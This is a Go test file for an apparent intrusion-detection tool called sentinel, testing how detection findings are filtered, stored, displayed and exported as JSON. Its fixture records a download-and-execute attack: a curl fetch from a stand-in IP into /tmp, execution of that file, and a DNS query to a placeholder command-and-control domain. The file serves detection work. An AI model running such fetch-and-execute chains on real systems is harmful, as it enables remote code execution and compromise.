package main

import (
	"database/sql"
	"encoding/json"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/arafat2020/sentinel/internal/core"
	"github.com/arafat2020/sentinel/internal/detection/correlation"
	"github.com/arafat2020/sentinel/internal/store"
)

var findingEpoch = time.Date(2026, 3, 4, 10, 0, 0, 0, time.UTC)

// downloadFinding is a download-and-execute finding with everything a detail
// view can show: three roles, a process that exec'd, a timeline of four
// events and a capture.
func downloadFinding(n int) core.Finding {
	at := findingEpoch.Add(time.Duration(n) * time.Minute)

	shell := core.Process{PID: 4120, PPID: 1, Name: "sh", Executable: "/usr/bin/dash", CommandLine: "sh -c curl ...", User: "www-data", StartTime: at.Add(-time.Hour)}
	curl := core.Process{PID: 4125, PPID: 4120, Name: "curl", Executable: "/usr/bin/curl", CommandLine: "curl -s -o /tmp/x http://203.0.113.9/x", User: "www-data", StartTime: at}
	payload := core.Process{PID: 4131, PPID: 4120, Name: "x", Executable: "/tmp/x", CommandLine: "/tmp/x --daemon", User: "www-data", StartTime: at.Add(5 * time.Second)}

	return core.Finding{
		ID:          "finding-" + string(rune('a'+n)),
		Timestamp:   at.Add(5 * time.Second),
		Severity:    core.SeverityCritical,
		Rule:        "download-and-execute",
		Title:       "Downloaded file executed",
		Description: "A process made a network connection and created a file under /tmp, and the process that started it then ran that file.",
		Evidence: core.Evidence{
			Process:   &payload,
			Processes: []core.Process{shell, curl, payload},
			Roles:     map[string]core.Process{"launcher": shell, "downloader": curl, "payload": payload},
			PreviousImages: map[string][]core.ProcessImage{
				"payload": {{Name: "sh", Executable: "/usr/bin/dash", CommandLine: "sh -c curl ...", ReplacedAt: at.Add(5 * time.Second)}},
			},
			Events: []core.Event{
				{Type: core.EventNetworkConnect, Timestamp: at.Add(1100 * time.Millisecond), Process: &curl,
					Network: &core.NetworkConnection{Protocol: "tcp", RemoteAddress: "203.0.113.9", RemotePort: 80}},
				{Type: core.EventFileCreate, Timestamp: at.Add(40 * time.Millisecond), Process: &curl,
					File: &core.FileEvent{Path: "/tmp/x", Operation: core.FileCreate}},
				{Type: core.EventProcessStart, Timestamp: at.Add(5 * time.Second), Process: &payload},
				{Type: core.EventDNSQuery, Timestamp: at.Add(65 * time.Second), Process: &payload,
					DNS: &core.DNSQuery{Domain: "c2.example", Type: "A"}},
			},
		},
	}
}

// downloadPattern is the rule that produced downloadFinding, as far as the
// captures are concerned.
func downloadPattern() correlation.BehaviorPattern {
	return correlation.BehaviorPattern{
		Name: "download-and-execute",
		Sequence: &correlation.SequencePattern{Steps: []correlation.SequenceStep{
			{Role: "downloader", Type: core.EventNetworkConnect},
			{Role: "downloader", Type: core.EventFileCreate, Capture: "dropped"},
			{Role: "payload", Type: core.EventProcessStart},
		}},
	}
}

func otherFinding(n int, severity core.Severity, rule string) core.Finding {
	process := core.Process{PID: int32(900 + n), Name: "python3"}
	return core.Finding{
		ID: "other-" + string(rune('a'+n)), Timestamp: findingEpoch.Add(time.Duration(n) * time.Minute),
		Severity: severity, Rule: rule, Title: "Something else",
		Evidence: core.Evidence{Process: &process, Roles: map[string]core.Process{"p": process}},
	}
}

func keysOf(items []findingItem) string {
	keys := make([]string, len(items))
	for i, item := range items {
		keys[i] = item.Key
	}
	return strings.Join(keys, " ")
}

func TestFindingsModelFiltersAndSorts(t *testing.T) {
	m := newFindingsModel(nil)
	changes := 0
	m.OnChange(func() { changes++ })

	m.Add(otherFinding(0, core.SeverityLow, "rule-a"))    // other-a, 10:00
	m.Add(downloadFinding(1))                             // finding-b, 10:01:05
	m.Add(otherFinding(2, core.SeverityHigh, "rule-a"))   // other-c, 10:02
	m.Add(otherFinding(3, core.SeverityMedium, "rule-b")) // other-d, 10:03

	if got := keysOf(m.Visible()); got != "other-d other-c finding-b other-a" {
		t.Errorf("default order (newest first) = %q", got)
	}

	m.SetFilter(findingFilter{OldestFirst: true})
	if got := keysOf(m.Visible()); got != "other-a finding-b other-c other-d" {
		t.Errorf("oldest first = %q", got)
	}

	m.SetFilter(findingFilter{Rule: "rule-a"})
	if got := keysOf(m.Visible()); got != "other-c other-a" {
		t.Errorf("rule filter = %q", got)
	}
	m.SetFilter(findingFilter{Severity: core.SeverityCritical})
	if got := keysOf(m.Visible()); got != "finding-b" {
		t.Errorf("severity filter = %q", got)
	}

	if err := m.SetStatus("other-c", core.StatusAcknowledged); err != nil {
		t.Fatal(err)
	}
	if err := m.SetStatus("other-a", core.StatusDismissed); err != nil {
		t.Fatal(err)
	}
	m.SetFilter(findingFilter{Status: core.StatusNew})
	if got := keysOf(m.Visible()); got != "other-d finding-b" {
		t.Errorf("status filter = %q", got)
	}
	m.SetFilter(findingFilter{Status: core.StatusDismissed, Rule: "rule-a", Severity: core.SeverityLow})
	if got := keysOf(m.Visible()); got != "other-a" {
		t.Errorf("combined filter = %q", got)
	}

	if total, unhandled := m.Counts(); total != 4 || unhandled != 2 {
		t.Errorf("counts = %d total, %d new", total, unhandled)
	}
	if got := strings.Join(m.Rules(), ","); got != "download-and-execute,rule-a,rule-b" {
		t.Errorf("rules = %q", got)
	}
	if err := m.SetStatus("nope", core.StatusDismissed); err == nil {
		t.Error("a status was set on a finding that does not exist")
	}
	if err := m.SetStatus("other-a", "resolved"); err == nil {
		t.Error("an unknown status was accepted")
	}
	// 4 adds, 5 filter changes, 2 status changes.
	if changes != 11 {
		t.Errorf("listeners were told %d times, want 11", changes)
	}

	if got := (findingFilter{Severity: core.SeverityHigh, OldestFirst: true}).String(); got != "sev:HIGH  status:all  rule:all  oldest first" {
		t.Errorf("filter description = %q", got)
	}
	if next(filterSeverities, "") != core.SeverityCritical || next(filterSeverities, core.SeverityInfo) != "" || next(filterStatuses, core.StatusDismissed) != "" {
		t.Error("filters do not cycle through their values")
	}
}

// Findings, and what was done about them, are still there after a restart,
// including ones stored by a version that kept only a line of text.
func TestFindingsModelSurvivesARestart(t *testing.T) {
	path := filepath.Join(t.TempDir(), "sentinel.db")

	db, err := store.Open(path)
	if err != nil {
		t.Fatal(err)
	}
	m := newFindingsModel(db)
	for n := 0; n < 5; n++ {
		m.Add(downloadFinding(n))
	}
	if err := m.SetStatus("finding-b", core.StatusAcknowledged); err != nil {
		t.Fatal(err)
	}
	if err := m.SetStatus("finding-e", core.StatusDismissed); err != nil {
		t.Fatal(err)
	}
	db.Close()

	// An old row, as a database from before this version would hold.
	raw, err := sql.Open("sqlite", path)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := raw.Exec(`INSERT INTO events(ts, tab, line) VALUES('2026-03-04T11:00:00Z', 'Findings', '[old-rule] An old finding — kept as a line')`); err != nil {
		t.Fatal(err)
	}
	raw.Close()

	db, err = store.Open(path)
	if err != nil {
		t.Fatal(err)
	}
	defer db.Close()

	restarted := newFindingsModel(db)
	loaded, err := restarted.LoadRecent(4)
	if err != nil || loaded != 4 {
		t.Fatalf("loaded %d, err %v; want the 4 most recent", loaded, err)
	}

	restarted.SetFilter(findingFilter{OldestFirst: true})
	visible := restarted.Visible()
	if len(visible) != 4 || visible[0].Key != "finding-c" || visible[2].Status != core.StatusDismissed {
		t.Fatalf("after restart: %s (%+v)", keysOf(visible), visible)
	}

	// The whole finding came back, evidence and all.
	if got := visible[0].Finding; got.Rule != "download-and-execute" || got.Evidence.Roles["payload"].Executable != "/tmp/x" ||
		len(got.Evidence.Events) != 4 || len(got.Evidence.PreviousImages["payload"]) != 1 {
		t.Errorf("finding after restart = %+v", got)
	}

	// The old row displays, by its line, and can be dealt with.
	old := visible[3]
	row := rowOf(old)
	if !strings.HasPrefix(old.Key, "row-") || row.Title != "[old-rule] An old finding — kept as a line" || row.Severity != "-" || row.Status != "new" {
		t.Errorf("old row = %+v, shown as %+v", old, row)
	}
	lines := strings.Join(detailLines(old, nil), "\n")
	if !strings.Contains(lines, "An old finding") || !strings.Contains(lines, "No evidence was stored with this finding.") {
		t.Errorf("old row detail:\n%s", lines)
	}
	if err := restarted.SetStatus(old.Key, core.StatusDismissed); err != nil {
		t.Fatal(err)
	}

	// A count of zero means "do not load".
	if loaded, _ := newFindingsModel(db).LoadRecent(0); loaded != 0 {
		t.Errorf("loaded %d with a limit of 0", loaded)
	}
}

func TestFindingRowAndDetail(t *testing.T) {
	item := findingItem{Key: "k", Finding: downloadFinding(0), Status: core.StatusAcknowledged}

	row := rowOf(item)
	if row.Severity != "CRITICAL" || row.Rule != "download-and-execute" || row.Title != "Downloaded file executed" ||
		row.Process != "x(4131)" || row.Status != "acknowledged" || len(row.Time) != len("03-04 10:00:05") {
		t.Errorf("row = %+v", row)
	}

	text := strings.Join(detailLines(item, []correlation.BehaviorPattern{downloadPattern()}), "\n")
	for _, want := range []string{
		// Header.
		"CRITICAL  [download-and-execute]  Downloaded file executed",
		"A process made a network connection",
		"Status: acknowledged",
		// Roles, in name order, with everything known about each.
		"  downloader: curl  pid 4125  ppid 4120  user www-data",
		"      exe      /usr/bin/curl",
		"      cmdline  curl -s -o /tmp/x http://203.0.113.9/x",
		"  payload: x  pid 4131  ppid 4120  user www-data",
		"      was      sh  (/usr/bin/dash)  until ",
		// Timeline: in time order, whatever order they were stored in, with
		// time since the first, the role, and what happened.
		"TIMELINE (4 events)",
		"+0        FILE_CREATE      downloader /tmp/x",
		"+1.060s   NETWORK_CONNECT  downloader tcp 203.0.113.9:80",
		"+4.960s   PROCESS_START    payload    /tmp/x --daemon",
		"+1m04s    DNS_QUERY        payload    c2.example (A)",
		// What the sequence captured: not stored with this finding, so
		// worked out from the rule, and labelled as such.
		"CAPTURES (derived from the rule as it is loaded now)",
		"  $dropped = FILE_CREATE  /tmp/x",
	} {
		if !strings.Contains(text, want) {
			t.Errorf("detail lacks %q:\n%s", want, text)
		}
	}
	if strings.Index(text, "FILE_CREATE      downloader") > strings.Index(text, "NETWORK_CONNECT  downloader") {
		t.Errorf("the timeline is not in time order:\n%s", text)
	}

	// Without the rule, or with a rule of a different shape, no captures
	// are claimed.
	for name, patterns := range map[string][]correlation.BehaviorPattern{
		"rule not loaded": nil,
		"rule changed": {{Name: "download-and-execute", Sequence: &correlation.SequencePattern{Steps: []correlation.SequenceStep{
			{Role: "downloader", Type: core.EventDNSQuery, Capture: "q"},
		}}}},
	} {
		if strings.Contains(strings.Join(detailLines(item, patterns), "\n"), "CAPTURES") {
			t.Errorf("%s: captures were shown", name)
		}
	}
}

func TestFindingJSONIsStableSnakeCase(t *testing.T) {
	text := findingJSON(findingItem{Key: "k", Finding: downloadFinding(0), Status: core.StatusDismissed})

	var decoded map[string]any
	if err := json.Unmarshal([]byte(text), &decoded); err != nil {
		t.Fatalf("not JSON: %v\n%s", err, text)
	}
	for _, key := range []string{"id", "timestamp", "severity", "rule", "title", "description", "evidence", "status"} {
		if _, ok := decoded[key]; !ok {
			t.Errorf("JSON lacks %q:\n%s", key, text)
		}
	}
	for _, want := range []string{`"status": "dismissed"`, `"previous_images"`, `"command_line": "/tmp/x --daemon"`, `"remote_address": "203.0.113.9"`, `"start_time"`} {
		if !strings.Contains(text, want) {
			t.Errorf("JSON lacks %s", want)
		}
	}
	for _, goName := range []string{`"ID"`, `"Evidence"`, `"CommandLine"`, `"Timestamp"`} {
		if strings.Contains(text, goName) {
			t.Errorf("JSON uses the Go field name %s", goName)
		}
	}

	// It reads back as the same finding.
	var back core.Finding
	if err := json.Unmarshal([]byte(text), &back); err != nil || back.Rule != "download-and-execute" || len(back.Evidence.Events) != 4 {
		t.Errorf("round trip: %+v, %v", back, err)
	}
}

func TestSummaryLine(t *testing.T) {
	state := patternState{Patterns: make([]correlation.BehaviorPattern, 7)}
	if got := summaryLine("ebpf", state, 12, 3); got != "collector: ebpf   patterns: 7   pattern errors: 0   findings: 3 new / 12" {
		t.Errorf("summary = %q", got)
	}
	state.FileError = "broken"
	if got := summaryLine("poll", state, 0, 0); !strings.Contains(got, "pattern errors: 1") {
		t.Errorf("summary = %q", got)
	}
}

// A finding carries its own captures. They are shown as recorded whatever has
// happened to the rule since: edited, renamed, or removed.
func TestStoredCapturesDoNotDependOnTheRule(t *testing.T) {
	f := downloadFinding(0)
	f.Evidence.Captures = []core.Capture{{Name: "dropped", Event: f.Evidence.Events[1]}}
	item := findingItem{Key: "k", Finding: f, Status: core.StatusNew}

	changed := downloadPattern()
	changed.Sequence.Steps = []correlation.SequenceStep{{Role: "downloader", Type: core.EventNetworkConnect, Capture: "conn"}}

	for name, patterns := range map[string][]correlation.BehaviorPattern{
		"rule as it was": {downloadPattern()},
		"rule edited":    {changed},
		"rule removed":   nil,
	} {
		text := strings.Join(detailLines(item, patterns), "\n")
		if !strings.Contains(text, "\nCAPTURES\n  $dropped = FILE_CREATE  /tmp/x") {
			t.Errorf("%s: stored capture not shown as recorded:\n%s", name, text)
		}
		if strings.Contains(text, "derived") || strings.Contains(text, "$conn") {
			t.Errorf("%s: captures were derived although the finding has its own:\n%s", name, text)
		}
	}

	captures, derived := findingCaptures(f, nil)
	if derived || len(captures) != 1 || captures[0].Name != "dropped" {
		t.Errorf("captures = %+v, derived %v", captures, derived)
	}

	// An old finding: derived when the rule is there, absent when not.
	old := downloadFinding(0)
	if captures, derived := findingCaptures(old, []correlation.BehaviorPattern{downloadPattern()}); !derived || len(captures) != 1 {
		t.Errorf("old finding with its rule: %+v, derived %v", captures, derived)
	}
	if captures, derived := findingCaptures(old, nil); derived || len(captures) != 0 {
		t.Errorf("old finding without its rule: %+v, derived %v", captures, derived)
	}

	// Captures are part of the stored and copied form.
	if text := findingJSON(item); !strings.Contains(text, `"captures"`) || !strings.Contains(text, `"name": "dropped"`) {
		t.Errorf("JSON lacks the captures:\n%s", text)
	}
}
